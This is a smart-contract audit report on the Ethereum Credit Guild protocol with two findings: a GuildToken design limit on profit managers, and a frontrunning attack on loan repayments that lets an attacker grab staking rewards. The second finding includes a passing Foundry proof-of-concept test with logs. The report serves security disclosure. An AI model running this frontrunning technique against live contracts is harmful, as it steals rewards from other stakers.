# Ethereum-credit-guild- Findings Report



## [M-1] Guild tokens cannot be used for multiple markets

### Code Line

https://github.com/volt-protocol/ethereum-credit-guild/blob/4d33abf95fee69391af0652e3cbe5e0cffa25f9f/src/tokens/GuildToken.sol#L41

### Impact

`GUILD` serves as the governance token for the protocol. It allows voting on governance decisions and increases the weight of gauges. Once the `GUILD` token is deployed, it cannot be modified or updated.

In the `GuildToken.sol` file, there is a single state variable called "profitManager." This variable is responsible for tracking and distributing all profits and losses specific to a particular market. Each market consists of one base asset and one credit token, such as `USDC: gUSDC`, and includes multiple collateral tokens in a lending term.

For every new market, a `profitManager` will be deployed. It is crucial for GUILD to reference all of them.

### Proof of concept

When the new market is deployed let’s say protocol wants to deploy a market for WETH: GWETH, these are the contracts that need to be deployed

- SimplePSM
- Profit manager
- Lending term - (*we clone the original with OZ clones*)
- Credit token
- Rate limited minter
- Surplus guild minter
- Lending term Off-boarding
- Lending term On-boarding
- Auction house
- SurplusGuildMinter
- LendingTermOffBoarding
- LendingTermOnBoarding

As you can see we have to deploy a new profit manager for a new market but the immutable guild contract can only reference one of many profit managers. If there are multiple markets then it is impossible to reference every profit manager in the Guild contract.

There are multiple instances where the `profitManager` is used in Guild token contract such as to validate the notifyGaugeLoss call and to claim the gauge rewards.

This is marked as high because this is a crucial issue and once GUILD it deployed and distributed it is so hard to redo it even if protocol decides to fix this in v2 and deploy a new GUILD.

```solidity
function notifyGaugeLoss(address gauge) external {
        require(msg.sender == profitManager, "UNAUTHORIZED");//audit profit manager used

        // save gauge loss
        lastGaugeLoss[gauge] = block.timestamp;
        emit GaugeLoss(gauge, block.timestamp);
    } 

```

```solidity
function _decrementGaugeWeight(
        address user,
        address gauge,
        uint256 weight
    ) internal override {
        uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
        uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][user];
        require(
            _lastGaugeLossApplied >= _lastGaugeLoss,
            "GuildToken: pending loss"
        );

        // update the user profit index and claim rewards
//@audit here profit manager is used
        ProfitManager(profitManager).claimGaugeRewards(user, gauge);

        // check if gauge is currently using its allocated debt ceiling.
        // To decrement gauge weight, guild holders might have to call loans if the debt ceiling is used.
        uint256 issuance = LendingTerm(gauge).issuance();
        if (issuance != 0) {
            uint256 debtCeilingAfterDecrement = LendingTerm(gauge).debtCeiling(-int256(weight));
            require(
                issuance <= debtCeilingAfterDecrement,
                "GuildToken: debt ceiling used"
            );
        }

        super._decrementGaugeWeight(user, gauge, weight);
    }
```

### Recommendation

use enumerable Address sets to store the profit manager addresses and update and add a new address when a new market is deployed. 
Inside the `notifyGaugeLoss` it should check if the set contains the msg. sender and appropriate gauge should be called to claim the reward and update the profit index.



## [M-2] `repay` and `partialRepay` can be frontrunned and a malicious user can claim the rewards instantly.

### Code Line

https://github.com/volt-protocol/ethereum-credit-guild/blob/4d33abf95fee69391af0652e3cbe5e0cffa25f9f/src/loan/LendingTerm.sol#L490

https://github.com/volt-protocol/ethereum-credit-guild/blob/4d33abf95fee69391af0652e3cbe5e0cffa25f9f/src/loan/LendingTerm.sol#L567

https://github.com/volt-protocol/ethereum-credit-guild/blob/4d33abf95fee69391af0652e3cbe5e0cffa25f9f/src/loan/SurplusGuildMinter.sol#L114

https://github.com/volt-protocol/ethereum-credit-guild/blob/4d33abf95fee69391af0652e3cbe5e0cffa25f9f/src/loan/SurplusGuildMinter.sol#L158

### Impact

The `LendingTerm:repay` and `LendingTerm:partialRepay` functions can be frontrunned by the malicious user to stake the CREDIT with `SurplusGuildMinter:stake`. By doing this malicious actors essentially steal the user’s rewards by staking for only one transaction and unstaking immediately after it. 

### Proof of concept

When the borrower repays their loan, the interest is distributed to Guild stakers, credit holders, surplus buffer, and possibly protocols treasury. 

The Guild stakers receive CREDIT tokens and GUILD as a reward for staking in the gauge, and the reward is distributed based on the amount of the GUILD staked by the user. The malicious actor can take advantage of this can monitor the mempool for any `repay` or `partialRepay`

If he sees any of these transactions coming in he can quickly front-run it and stake his CREDIT or increase the weight with his GUILD in the gauge where profit is coming and steal the large share of reward from other stakers.

### Flow

- borrow calls `repay` or `partialRepay` with principal +  interest
- attacker front-runs the transaction and increases the weight of the gauge with the large amount
- repayment executes and `profitManager:notifyPnl` is called internally to distribute rewards
- attacker receives his share of CREDIT and GUIlD
- he unstake immediately in the next transaction and steals those rewards without getting exposed to any risks of staking.

A simple foundry test to show how this will come into play

```solidity
function test_frontrunAndStealRewards() public {
        //Set profit split
        vm.prank(governor);
        profitManager.setProfitSharingConfig(
            0.5e18, // surplusBufferSplit
            0, // creditSplit
            0.5e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        // Alice is already staking 100e18 credit
        credit.mint(address(alice), 100e18);
        vm.startPrank(alice);
        credit.approve(address(sgm), 100e18);
        sgm.stake(address(term), 100e18);
        vm.stopPrank();

        /* --------------------------------- BORROW -------------------------------- */
        address borrower = address(0x33);

        collateral.mint(borrower, 100e18);
        vm.startPrank(borrower);
        collateral.approve(address(term), 100e18);
        bytes32 loanId = term.borrow(10000e18, 100e18);
        vm.stopPrank();

        skip(30 days); // repaying after 30 days

        /* --------------------------------- ATTAKER FRONTRUN  -------------------------------- */
        //Attaker is address(this)
        uint ONE_MILLION = 1000000e18;
        collateral.mint(address(this), ONE_MILLION); // 1M
        collateral.approve(address(psm), ONE_MILLION); // 1M
        psm.mintAndEnterRebase(ONE_MILLION); // 1m credit minted
        assertEq(collateral.balanceOf(address(psm)), ONE_MILLION);
        assertEq(credit.balanceOf(address(this)), ONE_MILLION);

        credit.approve(address(sgm), ONE_MILLION);
        sgm.stake(address(term), ONE_MILLION);
        assertEq(
            credit.balanceOf(address(profitManager)),
            ONE_MILLION + 100e18
        );
        assertEq(
            profitManager.termSurplusBuffer(address(term)),
            ONE_MILLION + 100e18
        );
        assertEq(
            guild.getUserGaugeWeight(address(sgm), address(term)),
            ONE_MILLION * 2 + 200e18
        ); // 2M GUILD is a weight for 1m credit

        /* ----------------------------- BOROWER REPAYS ----------------------------- */

        uint principal = term.getLoan(loanId).borrowAmount;
        uint256 interestAccured = term.getLoanDebt(loanId) - principal;

        credit.mint(borrower, interestAccured);
        vm.startPrank(borrower);
        credit.approve(address(term), principal + interestAccured);
        term.repay(loanId);
        vm.stopPrank();

        /* ----------------------------- PROFIT SHARING ----------------------------- */
        console.log(
            "Attaker credit bal before",
            credit.balanceOf(address(this))
        );
        console.log("Attaker Guild bal before", guild.balanceOf(address(this)));

        console.log(
            "------------------------------------------------------------------"
        );
        sgm.unstake(address(term), ONE_MILLION);
        uint attakerGuildRewards = guild.balanceOf(address(this));
        uint attakerCreditRewards = credit.balanceOf(address(this)) -
            ONE_MILLION;
        assertEq(attakerGuildRewards, 499950004999500000000);
        console.log(
            "Attaker credit rewards",
            attakerCreditRewards,
            "= 99.99 CREDIT"
        );
        console.log(
            "Attaker Guild Reward",
            guild.balanceOf(address(this)),
            "=499.99 GUILD"
        );

        /* --------------------------------- ALICE GET REWARDS-------------------------------- */
        vm.startPrank(alice);
        console.log(
            "------------------------------------------------------------------"
        );
        console.log(
            "Alice credit bal before",
            credit.balanceOf(address(alice))
        );
        console.log("Alice Guild bal before", guild.balanceOf(address(alice)));
        sgm.getRewards(address(alice), address(term));
        console.log(
            "------------------------------------------------------------------"
        );
        console.log(
            "Alice credit bal after",
            credit.balanceOf(address(alice)),
            "= 0.009 CREDIT"
        );
        console.log(
            "Alice Guild bal after",
            guild.balanceOf(address(alice)),
            "= 0.049 GUILD"
        );
        vm.stopPrank();
    }
```

```solidity
[PASS] test_frontrunAndStealRewards() (gas: 1484537)
Logs:
  loan.borrowAmount 10000000000000000000000
  Attaker credit bal before 0
  Attaker Guild bal before 0
  ------------------------------------------------------------------
  Attaker credit rewards 99990000999900000000 = 99.99 CREDIT
  Attaker Guild Reward 499950004999500000000 =499.99 GUILD
  ------------------------------------------------------------------
  Alice credit bal before 0
  Alice Guild bal before 0
  ------------------------------------------------------------------
  Alice credit bal after 9999000099990000 = 0.009 CREDIT
  Alice Guild bal after 49995000499950000 = 0.049 GUILD

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.94ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### recommendation

There should be some lockup period for GUILD stakers to be eligible for the rewards.